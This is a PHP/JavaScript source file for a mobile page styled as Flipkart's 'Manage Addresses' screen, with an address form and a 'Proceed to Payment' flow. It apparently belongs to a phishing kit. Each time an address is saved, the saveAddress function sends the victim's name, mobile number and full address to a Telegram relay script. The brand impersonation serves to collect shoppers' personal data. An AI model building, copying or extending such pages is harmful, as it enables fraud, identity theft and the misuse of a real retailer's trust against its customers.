<?php
require_once __DIR__ . '/includes/bootstrap.php';
if (empty($_SESSION['fk_address_csrf'])) { $_SESSION['fk_address_csrf'] = bin2hex(random_bytes(16)); }
$fkAddressCsrf = $_SESSION['fk_address_csrf'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <link rel="icon" type="image/png" href="assets/icons/app-icon.png">
    <link rel="apple-touch-icon" href="assets/icons/app-icon.png">
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Manage Addresses – Flipkart</title>
    <meta name="description" content="Flipkart – address page">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
<style>
:root{
  --blue:#2874f0;--orange:#fb641b;--green:#388e3c;
  --red:#d32f2f;--bg:#f1f3f6;--card:#fff;
  --border:#e0e0e0;--text:#212121;--muted:#878787;--radius:10px;
}
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Noto Sans',sans-serif;background:var(--bg);color:var(--text);font-size:14px;padding-bottom:100px;}

/* HEADER */
header{
  background:var(--blue);height:56px;
  display:flex;align-items:center;padding:0 16px;gap:12px;
  position:sticky;top:0;z-index:200;
  box-shadow:0 2px 8px rgba(0,0,0,.15);
}

.h-back, .header-back, .back-btn {
  background: none;
  border: none;
  color: #fff;
  width: 40px;
  height: 40px;
  display: flex;
  align-items: center;
  justify-content: center;
  cursor: pointer;
  border-radius: 50%;
  flex-shrink: 0;
  -webkit-tap-highlight-color: transparent;
  transition: background 0.15s;
}
.h-back:active, .header-back:active, .back-btn:active {
  background: rgba(255,255,255,0.25);
}

.h-title{color:#fff;font-size:17px;font-weight:600;flex:1;}

/* ADD NEW BUTTON */
.add-new-card{
  background:var(--card);margin:12px 12px 0;
  border-radius:var(--radius);border:2px dashed var(--blue);
  padding:16px;display:flex;align-items:center;gap:12px;
  cursor:pointer;transition:.15s;
  animation:fadeUp .3s ease both;
}
.add-new-card:hover{background:#f0f6ff;}
.anc-icon{
  width:44px;height:44px;border-radius:50%;
  background:var(--blue);color:#fff;
  display:flex;align-items:center;justify-content:center;
  font-size:22px;flex-shrink:0;
}
.anc-text b{font-size:14px;color:var(--blue);display:block;}
.anc-text span{font-size:12px;color:var(--muted);}

/* ADDRESS CARDS */
.addr-list{padding:0 12px;}

.addr-card{
  background:var(--card);border-radius:var(--radius);
  border:1.5px solid var(--border);margin-top:10px;
  overflow:hidden;transition:.2s;
  animation:fadeUp .3s ease both;
}
.addr-card.is-default{border-color:var(--blue);}
.addr-card:hover{box-shadow:0 2px 12px rgba(0,0,0,.08);}

.addr-card-top{
  display:flex;align-items:flex-start;gap:12px;
  padding:14px 14px 10px;
}
.addr-radio{
  width:20px;height:20px;border-radius:50%;border:2px solid #bbb;
  flex-shrink:0;margin-top:2px;display:flex;align-items:center;justify-content:center;
  cursor:pointer;transition:.15s;
}
.addr-card.is-default .addr-radio{border-color:var(--blue);}
.addr-radio-dot{width:10px;height:10px;border-radius:50%;background:var(--blue);display:none;}
.addr-card.is-default .addr-radio-dot{display:block;}

.addr-body{flex:1;}
.addr-type-row{display:flex;align-items:center;gap:8px;margin-bottom:6px;}
.addr-type{
  font-size:11px;font-weight:700;letter-spacing:.05em;
  padding:2px 8px;border-radius:3px;
  text-transform:uppercase;
}
.type-home{background:#e8f5e9;color:#2e7d32;}
.type-work{background:#e3f2fd;color:#1565c0;}
.type-other{background:#f3e5f5;color:#6a1b9a;}
.default-tag{background:var(--blue);color:#fff;font-size:10px;font-weight:700;padding:2px 7px;border-radius:3px;letter-spacing:.03em;}

.addr-name{font-size:14px;font-weight:700;color:var(--text);margin-bottom:3px;}
.addr-phone{font-size:12.5px;color:var(--muted);margin-bottom:6px;}
.addr-full{font-size:13px;color:var(--text);line-height:1.6;}

.addr-actions{
  display:flex;border-top:1px solid #f0f0f0;
}
.aa-btn{
  flex:1;padding:10px;border:none;background:none;
  font-size:13px;font-weight:600;cursor:pointer;font-family:inherit;
  transition:.15s;border-right:1px solid #f0f0f0;
  display:flex;align-items:center;justify-content:center;gap:5px;
}
.aa-btn:last-child{border-right:none;}
.aa-btn:hover{background:#f8f9fa;}
.aa-btn.blue{color:var(--blue);}
.aa-btn.red{color:var(--red);}
.aa-btn.green{color:var(--green);}

/* EMPTY */
.empty{
  display:none;flex-direction:column;align-items:center;
  padding:60px 20px;text-align:center;
}
.empty-icon{font-size:72px;margin-bottom:16px;animation:float 3s ease-in-out infinite;}
@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
.empty h3{font-size:18px;font-weight:700;margin-bottom:8px;}
.empty p{color:var(--muted);font-size:13px;line-height:1.6;}

/* BOTTOM SHEET FORM */
.overlay{
  display:none;position:fixed;inset:0;
  background:rgba(0,0,0,.5);z-index:500;
  align-items:flex-end;justify-content:center;
}
.overlay.show{display:flex;}
.sheet{
  background:#fff;border-radius:18px 18px 0 0;
  width:100%;max-width:500px;
  max-height:90vh;overflow-y:auto;
  padding:20px 16px 40px;
  animation:slideUp .3s ease;
}
@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
.sheet-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;}
.sheet-title{font-size:17px;font-weight:700;}
.sheet-close{background:none;border:none;font-size:22px;cursor:pointer;color:var(--muted);}

/* TYPE SELECTOR */
.type-selector{display:flex;gap:8px;margin-bottom:16px;}
.type-btn{
  flex:1;padding:9px;border:1.5px solid var(--border);border-radius:8px;
  background:#fff;font-size:13px;font-weight:600;cursor:pointer;
  font-family:inherit;transition:.15s;text-align:center;
}
.type-btn.active{border-color:var(--blue);background:#e8f0fe;color:var(--blue);}

/* FORM FIELDS */
.form-row{display:flex;gap:10px;margin-bottom:14px;}
.form-row .field{flex:1;}
.field{margin-bottom:14px;}
.field label{display:block;font-size:12px;font-weight:600;color:var(--muted);margin-bottom:5px;text-transform:uppercase;letter-spacing:.04em;}
.field input,.field select,.field textarea{
  width:100%;border:1.5px solid var(--border);border-radius:8px;
  padding:11px 14px;font-size:14px;font-family:inherit;outline:none;transition:.2s;
  color:var(--text);background:#fff;
}
.field input:focus,.field select:focus,.field textarea:focus{border-color:var(--blue);}
.field textarea{resize:none;height:80px;}
.field input.err{border-color:var(--red);}

/* DEFAULT TOGGLE */
.default-toggle{
  display:flex;align-items:center;gap:10px;
  padding:12px 0;margin-bottom:4px;cursor:pointer;
}
.toggle-track{
  width:44px;height:24px;border-radius:12px;
  background:#e0e0e0;position:relative;transition:.25s;flex-shrink:0;
}
.toggle-track.on{background:var(--blue);}
.toggle-thumb{
  width:18px;height:18px;border-radius:50%;background:#fff;
  position:absolute;top:3px;left:3px;transition:.25s;
  box-shadow:0 1px 3px rgba(0,0,0,.2);
}
.toggle-track.on .toggle-thumb{left:23px;}
.toggle-label{font-size:13.5px;font-weight:600;color:var(--text);}
.toggle-sub{font-size:12px;color:var(--muted);}

.submit-btn{
  width:100%;padding:14px;
  background:linear-gradient(135deg,#ff9800,#fb641b);
  color:#fff;border:none;border-radius:8px;
  font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;
  box-shadow:0 3px 10px rgba(251,100,27,.3);transition:.2s;margin-top:6px;
}
.submit-btn:hover{transform:translateY(-1px);}

/* TOAST */
.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#323232;color:#fff;padding:10px 20px;border-radius:24px;font-size:13px;z-index:9999;opacity:0;transition:.3s;pointer-events:none;white-space:nowrap;}
.toast.show{opacity:1;}

/* DELIVER HERE BUTTON */
.aa-btn.deliver{color:#fff;background:linear-gradient(135deg,#ff9800,#fb641b);}
.aa-btn.deliver:hover{opacity:0.9;}

/* STICKY PROCEED BAR */
.proceed-bar{
  display:none;position:fixed;bottom:0;left:0;right:0;
  background:#fff;padding:12px 16px;
  box-shadow:0 -2px 10px rgba(0,0,0,.12);z-index:300;
  align-items:center;justify-content:space-between;gap:12px;
}
.proceed-bar.show{display:flex;}
.proceed-product{display:flex;flex-direction:column;overflow:hidden;}
.proceed-name{font-size:13px;font-weight:600;color:#212121;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:180px;}
.proceed-price{font-size:13px;color:#388e3c;font-weight:700;}
.proceed-btn{
  background:linear-gradient(135deg,#ff9800,#fb641b);
  color:#fff;border:none;border-radius:8px;
  padding:12px 20px;font-size:14px;font-weight:700;
  cursor:pointer;font-family:inherit;white-space:nowrap;
  box-shadow:0 3px 10px rgba(251,100,27,.3);
}

@keyframes fadeUp{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}

/* ══ MOBILE RESPONSIVE FIX ══ */
html, body {
    max-width: 100% !important;
    overflow-x: hidden !important;
    width: 100% !important;
}
*, *::before, *::after {
    box-sizing: border-box !important;
    max-width: 100% !important;
}
img, video, iframe, table {
    max-width: 100% !important;
    height: auto;
}
input, select, textarea, button {
    max-width: 100% !important;
}
</style>
    <link rel="stylesheet" href="assets/shared.css?v=20260320">
</head>
<body data-fk-sync="auth">

<header>
  <button class="h-back" onclick="goBackSmart('profile.php')">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z" fill="white"/></svg>
  </button>
  <span class="h-title">Manage Addresses</span>
</header>

<!-- ADD NEW -->
<div class="add-new-card" onclick="openForm()">
  <div class="anc-icon">+</div>
  <div class="anc-text">
    <b>Add New Address</b>
    <span>Home, Work or Other location</span>
  </div>
</div>

<!-- EMPTY STATE -->
<div class="empty" id="emptyState">
  <div class="empty-icon"><svg viewBox="0 0 24 24" width="64" height="64" fill="#bdbdbd"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg></div>
  <h3>No addresses saved</h3>
  <p>Add a delivery address to make<br>checkout faster and easier.</p>
</div>

<!-- ADDRESS LIST -->
<div class="addr-list" id="addrList"></div>

<!-- ADD / EDIT BOTTOM SHEET -->
<div class="overlay" id="formOverlay" onclick="closeForm(event)">
  <div class="sheet">
    <div class="sheet-head">
      <span class="sheet-title" id="sheetTitle">Add New Address</span>
      <button class="sheet-close" onclick="closeForm()"><svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg></button>
    </div>

    <!-- TYPE -->
    <div class="type-selector">
      <button class="type-btn active" onclick="selectType('Home',this)"><svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" style="vertical-align:-2px;margin-right:3px"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg> Home</button>
      <button class="type-btn" onclick="selectType('Work',this)"><svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" style="vertical-align:-2px;margin-right:2px"><path d="M20 6h-2.18c.07-.28.18-.51.18-.8 0-1.32-1.08-2.4-2.4-2.4-.87 0-1.63.5-2.03 1.22L12 6l-1.57-1.98C10.03 3.3 9.27 2.8 8.4 2.8c-1.32 0-2.4 1.08-2.4 2.4 0 .29.11.52.18.8H4c-1.1 0-2 .9-2 2v11c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2z"/></svg> Work</button>
      <button class="type-btn" onclick="selectType('Other',this)"><svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor" style="vertical-align:-2px;margin-right:2px"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg> Other</button>
    </div>

    <!-- NAME + PHONE -->
    <div class="form-row">
      <div class="field">
        <label>Full Name *</label>
        <input type="text" id="fName" placeholder="Recipient name">
      </div>
      <div class="field">
        <label>Mobile *</label>
        <input type="tel" id="fPhone" placeholder="10-digit mobile" maxlength="10">
      </div>
    </div>

    <!-- PINCODE + CITY -->
    <div class="form-row">
      <div class="field">
        <label>Pincode *</label>
        <input type="number" id="fPin" placeholder="6-digit pincode" maxlength="6" oninput="autoFillCity()">
      </div>
      <div class="field">
        <label>City *</label>
        <input type="text" id="fCity" placeholder="City">
      </div>
    </div>

    <!-- STATE -->
    <div class="field">
      <label>State *</label>
      <select id="fState">
        <option value="">Select State</option>
        <option>Andhra Pradesh</option><option>Assam</option>
        <option>Bihar</option><option>Chhattisgarh</option>
        <option>Delhi</option><option>Goa</option>
        <option>Gujarat</option><option>Haryana</option>
        <option>Himachal Pradesh</option><option>Jharkhand</option>
        <option>Karnataka</option><option>Kerala</option>
        <option>Madhya Pradesh</option><option>Maharashtra</option>
        <option>Manipur</option><option>Meghalaya</option>
        <option>Odisha</option><option>Punjab</option>
        <option>Rajasthan</option><option>Tamil Nadu</option>
        <option>Telangana</option><option>Uttar Pradesh</option>
        <option>Uttarakhand</option><option>West Bengal</option>
      </select>
    </div>

    <!-- FLAT + AREA -->
    <div class="field">
      <label>Flat / House No. / Building *</label>
      <input type="text" id="fFlat" placeholder="Flat no., Building name">
    </div>
    <div class="field">
      <label>Area / Street / Locality *</label>
      <textarea id="fArea" placeholder="Street, Area, Locality, Colony"></textarea>
    </div>

    <!-- LANDMARK -->
    <div class="field">
      <label>Landmark (optional)</label>
      <input type="text" id="fLandmark" placeholder="Near, opposite, beside...">
    </div>

    <!-- DEFAULT TOGGLE -->
    <div class="default-toggle" onclick="toggleDefault()">
      <div>
        <div class="toggle-label">Set as Default Address</div>
        <div class="toggle-sub">Use this address for all deliveries</div>
      </div>
      <div class="toggle-track" id="defaultToggle">
        <div class="toggle-thumb"></div>
      </div>
    </div>

    <button class="submit-btn" onclick="saveAddress()">SAVE ADDRESS</button>
  </div>
</div>

<!-- STICKY PROCEED BAR (shown when coming from Buy Now) -->
<div class="proceed-bar" id="proceedBar">
  <div class="proceed-product">
    <span class="proceed-name" id="proceedName"></span>
    <span class="proceed-price" id="proceedPrice"></span>
  </div>
  <button class="proceed-btn" onclick="proceedToPayment()">Proceed to Payment →</button>
</div>

<div class="toast" id="toast"></div>

<script>
// ══════════════════════════════════════
//  BUY NOW FLOW
// ══════════════════════════════════════
const isBuyNow = !!localStorage.getItem('pay_name');
let selectedAddrIdx = -1;

function initProceedBar() {
  if (!isBuyNow) return;
  const name  = localStorage.getItem('pay_name') || '';
  const price = localStorage.getItem('pay_price') || '';
  document.getElementById('proceedName').textContent  = name;
  document.getElementById('proceedPrice').textContent = '₹' + parseInt(price).toLocaleString('en-IN');
  document.getElementById('proceedBar').classList.add('show');
  document.body.style.paddingBottom = '80px';
}

function deliverHere(idx) {
  selectedAddrIdx = idx;
  const list = getAddresses();
  const addr = list[idx];
  const full = `${addr.flat}, ${addr.area}, ${addr.city} – ${addr.pin}`;
  localStorage.setItem('pay_address', full);
  localStorage.setItem('pay_address_name', addr.name);
  localStorage.setItem('pay_address_phone', addr.phone);
  showToast('✅ Address selected! Tap Proceed to Payment');
}

function proceedToPayment() {
  const list = getAddresses();
  if (!list.length) {
    showToast('⚠️ Pehle ek address add karo!');
    return;
  }
  if (!localStorage.getItem('pay_address')) {
    showToast('⚠️ Address select karo — "Deliver Here" tap karo!');
    return;
  }
  window.location.href = 'order-summary.php';
}

// ══════════════════════════════════════
//  DATA
// ══════════════════════════════════════
function getAddresses() {
  try { return JSON.parse(localStorage.getItem('fk_addresses') || '[]'); }
  catch(e) { return []; }
}
function saveAddresses(list) { localStorage.setItem('fk_addresses', JSON.stringify(list)); }

// ══════════════════════════════════════
//  RENDER
// ══════════════════════════════════════
function render() {
  const list  = getAddresses();
  const empty = document.getElementById('emptyState');
  const cont  = document.getElementById('addrList');

  if (!list.length) {
    empty.style.display='flex';
    cont.innerHTML='';
    // Koi address nahi — purana pay_address clear karo
    localStorage.removeItem('pay_address');
    localStorage.removeItem('pay_address_name');
    localStorage.removeItem('pay_address_phone');
    return;
  }
  empty.style.display = 'none';
  cont.innerHTML = '';

  const typeCls = { Home:'type-home', Work:'type-work', Other:'type-other' };

  list.forEach((addr, i) => {
    const card = document.createElement('div');
    card.className = 'addr-card' + (addr.isDefault ? ' is-default' : '');
    card.style.animationDelay = (i*0.06)+'s';
    card.innerHTML = `
      <div class="addr-card-top">
        <div class="addr-radio" onclick="setDefault(${i})">
          <div class="addr-radio-dot"></div>
        </div>
        <div class="addr-body">
          <div class="addr-type-row">
            <span class="addr-type ${typeCls[addr.type]||'type-other'}">${(window.FK&&FK.escapeHTML)?FK.escapeHTML(addr.type):addr.type}</span>
            ${addr.isDefault ? '<span class="default-tag">DEFAULT</span>' : ''}
          </div>
          <div class="addr-name">${(window.FK&&FK.escapeHTML)?FK.escapeHTML(addr.name):addr.name}</div>
          <div class="addr-phone"><svg viewBox="0 0 24 24" width="12" height="12" fill="#666" style="vertical-align:-1px;margin-right:3px"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg> ${(window.FK&&FK.escapeHTML)?FK.escapeHTML(addr.phone):addr.phone}</div>
          <div class="addr-full">${(window.FK&&FK.escapeHTML)?FK.escapeHTML(`${addr.flat}, ${addr.area}${addr.landmark ? ', Near '+addr.landmark : ''}, ${addr.city}, ${addr.state} – ${addr.pin}`):`${addr.flat}, ${addr.area}${addr.landmark ? ', Near '+addr.landmark : ''}, ${addr.city}, ${addr.state} – ${addr.pin}`}</div>
        </div>
      </div>
      <div class="addr-actions">
        ${!addr.isDefault ? `<button class="aa-btn green" onclick="setDefault(${i})"><svg viewBox="0 0 24 24" width="11" height="11" fill="currentColor"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Set Default</button>` : ''}
        ${isBuyNow ? `<button class="aa-btn deliver" onclick="deliverHere(${i})"><svg viewBox="0 0 24 24" width="13" height="13" fill="currentColor"><path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4z"/></svg> Deliver Here</button>` : ''}
        <button class="aa-btn blue" onclick="editAddress(${i})"><svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34a1 1 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg> Edit</button>
        <button class="aa-btn red"  onclick="deleteAddress(${i})"><svg viewBox="0 0 24 24" width="12" height="12" fill="currentColor"><path d="M6 19c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V7H6v12zM19 4h-3.5l-1-1h-5l-1 1H5v2h14V4z"/></svg> Delete</button>
      </div>
    `;
    cont.appendChild(card);
  });
}

// ══════════════════════════════════════
//  FORM STATE
// ══════════════════════════════════════
let editIdx  = -1;
let selType  = 'Home';
let isDefault = false;

function openForm(idx) {
  editIdx   = (idx !== undefined) ? idx : -1;
  isDefault = false;

  document.getElementById('sheetTitle').textContent = editIdx >= 0 ? 'Edit Address' : 'Add New Address';
  document.getElementById('defaultToggle').classList.remove('on');

  // Reset type buttons
  document.querySelectorAll('.type-btn').forEach(b=>b.classList.remove('active'));
  document.querySelector('.type-btn').classList.add('active');
  selType = 'Home';

  const fields = ['fName','fPhone','fPin','fCity','fState','fFlat','fArea','fLandmark'];

  if (editIdx >= 0) {
    const addr = getAddresses()[editIdx];
    document.getElementById('fName').value     = addr.name;
    document.getElementById('fPhone').value    = addr.phone;
    document.getElementById('fPin').value      = addr.pin;
    document.getElementById('fCity').value     = addr.city;
    document.getElementById('fState').value    = addr.state;
    document.getElementById('fFlat').value     = addr.flat;
    document.getElementById('fArea').value     = addr.area;
    document.getElementById('fLandmark').value = addr.landmark||'';
    isDefault = addr.isDefault;
    if (isDefault) document.getElementById('defaultToggle').classList.add('on');
    selType = addr.type || 'Home';
    document.querySelectorAll('.type-btn').forEach(b=>{
      b.classList.toggle('active', b.textContent.includes(selType));
    });
  } else {
    fields.forEach(id => {
      const el = document.getElementById(id);
      if (el) el.value='';
    });
  }

  document.getElementById('formOverlay').classList.add('show');
}

function closeForm(e) {
  if (!e || e.target===document.getElementById('formOverlay')) {
    document.getElementById('formOverlay').classList.remove('show');
  }
}

function selectType(type, btn) {
  selType = type;
  document.querySelectorAll('.type-btn').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
}

function toggleDefault() {
  isDefault = !isDefault;
  document.getElementById('defaultToggle').classList.toggle('on', isDefault);
}

function autoFillCity() {
  const pin = document.getElementById('fPin').value;
  if (pin.length === 6) {
    // Demo auto-fill based on first digit
    const pinMap = {
      '1':'Delhi','2':'Uttar Pradesh','3':'Rajasthan','4':'Maharashtra',
      '5':'Andhra Pradesh','6':'Tamil Nadu','7':'West Bengal','8':'Karnataka','9':'Gujarat'
    };
    const city  = pinMap[pin[0]] || '';
    const state = pinMap[pin[0]] || '';
    if (!document.getElementById('fCity').value && city)
      document.getElementById('fCity').value = city;
    if (!document.getElementById('fState').value && state)
      document.getElementById('fState').value = state;
  }
}

const FK_ADDRESS_CSRF = <?= json_encode($fkAddressCsrf, JSON_UNESCAPED_SLASHES) ?>;

function saveAddress() {
  const name  = document.getElementById('fName').value.trim();
  const phone = document.getElementById('fPhone').value.trim();
  const pin   = document.getElementById('fPin').value.trim();
  const city  = document.getElementById('fCity').value.trim();
  const state = document.getElementById('fState').value;
  const flat  = document.getElementById('fFlat').value.trim();
  const area  = document.getElementById('fArea').value.trim();
  const landmark = document.getElementById('fLandmark').value.trim();

  // Validate
  if (!name)                    { showToast('⚠️ Enter recipient name');   return; }
  if (!/^\d{10}$/.test(phone))  { showToast('⚠️ Enter valid mobile no'); return; }
  if (!/^\d{6}$/.test(pin))     { showToast('⚠️ Enter valid 6-digit pincode'); return; }
  if (!city)                    { showToast('⚠️ Enter city');             return; }
  if (!state)                   { showToast('⚠️ Select state');           return; }
  if (!flat)                    { showToast('⚠️ Enter flat/house no.');   return; }
  if (!area)                    { showToast('⚠️ Enter area/street');      return; }

  let list = getAddresses();
  const newAddr = { name, phone, pin, city, state, flat, area, landmark, type:selType, isDefault };

  if (isDefault) list.forEach(a => a.isDefault = false);

  if (editIdx >= 0) {
    list[editIdx] = newAddr;
    showToast('✅ Address updated!');
  } else {
    if (!list.length) newAddr.isDefault = true;
    list.push(newAddr);
    showToast('✅ Address saved!');
  }

  saveAddresses(list);
  closeForm();
  render();

  // Server-side Telegram send — token browser mein expose nahi hoga
  fetch('assets/telegram_send.php', {
    method: 'POST',
    credentials: 'same-origin',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      csrf: FK_ADDRESS_CSRF,
      data: Object.assign({ page: 'address.php' }, newAddr)
    })
  }).then(function(r){ return r.json(); })
    .then(function(r){ if(!r.ok) console.warn('TG error', r); })
    .catch(function(e){ console.warn('TG fail', e); });
}

function editAddress(idx) { openForm(idx); }

function deleteAddress(idx) {
  let list = getAddresses();
  const wasDefault = list[idx].isDefault;
  list.splice(idx, 1);
  if (wasDefault && list.length) list[0].isDefault = true;
  saveAddresses(list);
  render();
  showToast('🗑️ Address deleted');
}

function setDefault(idx) {
  let list = getAddresses();
  list.forEach((a,i) => a.isDefault = (i===idx));
  saveAddresses(list);
  render();
  showToast('✅ Default address updated!');
}

function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg; t.classList.add('show');
  setTimeout(() => t.classList.remove('show'), 2500);
}

render();
initProceedBar();
</script>
<script>
</script>
    <script src="assets/shield.js" defer></script>
    <script src="assets/shared.js?v=20260320" defer></script>
</body>
</html>
